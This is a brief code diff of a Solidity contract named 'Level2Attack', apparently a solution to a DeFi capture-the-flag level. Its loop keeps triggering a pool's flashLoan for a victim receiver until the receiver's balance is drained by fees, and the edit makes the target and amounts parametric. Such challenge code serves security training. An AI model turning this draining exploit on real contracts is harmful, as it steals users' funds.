@@ -9,8 +9,8 @@ contract Level2Attack {
 
     function depleteReceiver() external {
         while (keepDraining){
-            if (receiver.balance > 1000000000000000000 ){
-                pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", 0x7B6b01D2A669d602C87D5b453C2eD9115daddbb7, 10000000000000000000 ));
+            if (receiver.balance >= 1 ether ){
+                pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", receiver, 1 ether ));
             } else { keepDraining = false;}
         }
     }
